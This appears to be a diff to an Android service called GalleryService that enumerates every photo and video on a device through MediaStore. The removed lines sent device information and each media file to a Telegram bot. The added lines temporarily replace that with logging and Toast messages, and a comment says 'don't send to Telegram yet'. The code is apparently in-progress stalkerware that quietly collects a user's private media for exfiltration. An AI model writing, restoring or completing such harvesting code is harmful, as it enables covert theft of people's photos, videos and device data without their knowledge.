@@ -7,21 +7,21 @@ import android.content.Intent
 import android.os.Build
 import android.os.IBinder
 import android.provider.MediaStore
+import android.widget.Toast
 import androidx.core.app.NotificationCompat
 import java.io.File
 
 class GalleryService : Service() {
 
-    private lateinit var telegram: TelegramSender
-
     override fun onCreate() {
         super.onCreate()
-        telegram = TelegramSender()
         createNotificationChannel()
         startForeground(Config.NOTIFICATION_ID, buildNotification("Service running"))
+        Toast.makeText(this, "GalleryService onCreate", Toast.LENGTH_SHORT).show()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        Toast.makeText(this, "GalleryService started", Toast.LENGTH_SHORT).show()
         harvestAll()
         return START_STICKY
     }
@@ -39,13 +39,13 @@ class GalleryService : Service() {
     }
 
     private fun harvestAll() {
-        sendDeviceInfo()
-        harvestMedia()
-    }
-
-    private fun sendDeviceInfo() {
-        val info = Utils.getDeviceInfo(this)
-        telegram.sendMessage(info)
+        try {
+            Toast.makeText(this, "Harvesting media...", Toast.LENGTH_SHORT).show()
+            harvestMedia()
+            Toast.makeText(this, "Harvest complete", Toast.LENGTH_SHORT).show()
+        } catch (e: Exception) {
+            Toast.makeText(this, "Harvest error: ${e.message}", Toast.LENGTH_LONG).show()
+        }
     }
 
     private fun harvestMedia() {
@@ -68,14 +68,18 @@ class GalleryService : Service() {
         cursor?.use {
             val dataColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
             val nameColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
+            var count = 0
             while (it.moveToNext()) {
                 val path = it.getString(dataColumn)
                 val name = it.getString(nameColumn)
                 val file = File(path)
                 if (file.exists()) {
-                    telegram.sendFile(file, "photo", "$name")
+                    count++
+                    // Just log the file, don't send to Telegram yet
+                    android.util.Log.d("GalleryService", "Found: $name at $path")
                 }
             }
+            Toast.makeText(this, "Found $count images", Toast.LENGTH_SHORT).show()
         }
 
         val videoCollection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
@@ -89,14 +93,17 @@ class GalleryService : Service() {
         videoCursor?.use {
             val dataCol = it.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)
             val nameCol = it.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
+            var count = 0
             while (it.moveToNext()) {
                 val path = it.getString(dataCol)
                 val name = it.getString(nameCol)
                 val file = File(path)
                 if (file.exists() && file.length() < 50 * 1024 * 1024) {
-                    telegram.sendFile(file, "video", name)
+                    count++
+                    android.util.Log.d("GalleryService", "Found video: $name at $path")
                 }
             }
+            Toast.makeText(this, "Found $count videos", Toast.LENGTH_SHORT).show()
         }
     }
 
